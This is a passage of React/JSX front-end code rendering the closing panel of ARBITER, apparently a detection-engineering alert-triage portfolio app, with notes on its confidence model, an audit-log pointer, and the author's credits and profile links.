                      <p style={{ marginBottom:'13px' }}>Model E performs confidence decomposition in three components: base confidence, consistency bonus, and contradiction penalty.</p>
                      <p style={{ marginBottom:'13px' }}>The narrator layer synthesizes the signal trace under a hard constraint: it may only describe what the signals found. It cannot infer, project, or recommend action.</p>
                      <p style={{ fontFamily:'var(--font-mono), monospace', fontSize:'11px', color:'rgba(245,158,11,0.7)', marginTop:'4px' }}>github.com/LuisDuarte0/arbiter — README · ARCHITECTURE.md · SIGNALS.md</p>
                    </div>
                  </div>

                  <div style={{ marginBottom:'34px', paddingBottom:'34px', borderBottom:'0.5px solid var(--border)' }}>
                    <div style={S.finalSecLabel}>AUDIT AND HISTORY</div>
                    <div style={S.finalBody}><p>Your complete triage history lives in the Audit Log — accessible from the header.</p></div>
                  </div>

                  <div style={{ marginTop:'42px', paddingTop:'32px', borderTop:'0.5px solid var(--border)' }}>
                    <div style={{ ...S.finalSecLabel, marginBottom:'14px' }}>BUILT BY</div>
                    <div style={S.builtByName}>Luis Carlos Moreira Duarte</div>
                    <div style={S.builtByRole}>Detection Engineering · Tempest Security Intelligence · CompTIA Security+ · BTL1</div>
                    <div style={S.builtByText}>
                      ARBITER is a portfolio project demonstrating what production-grade detection engineering looks like end-to-end — enrichment pipelines, temporal correlation via Redis, a weighted behavioral signal model with ACS v2 provenance, and full MITRE ATT&CK coverage analysis.
                      <br /><br />
                      Every architectural decision in this codebase reflects something real: the noise problem, the false positive problem, the &quot;why did this alert fire?&quot; problem.
                    </div>
                    <div style={{ display:'flex', gap:'8px', marginTop:'20px', flexWrap:'wrap' }}>
                      <a href="https://linkedin.com/in/luisduarte0" target="_blank" rel="noreferrer" style={S.linkAmber}
                        onMouseEnter={e => (e.currentTarget.style.background='rgba(245,158,11,0.08)')}
                        onMouseLeave={e => (e.currentTarget.style.background='transparent')}
                      >LINKEDIN →</a>
                      <a href="https://github.com/LuisDuarte0/arbiter" target="_blank" rel="noreferrer" style={S.linkGhost}
                        onMouseEnter={e => (e.currentTarget.style.background='rgba(255,255,255,0.04)')}
                        onMouseLeave={e => (e.currentTarget.style.background='transparent')}
                      >GITHUB →</a>
                    </div>
                  </div>
                </motion.div>
              )}

            </AnimatePresence>
          </div>
        </div>
      </motion.div>
    </>
  )
}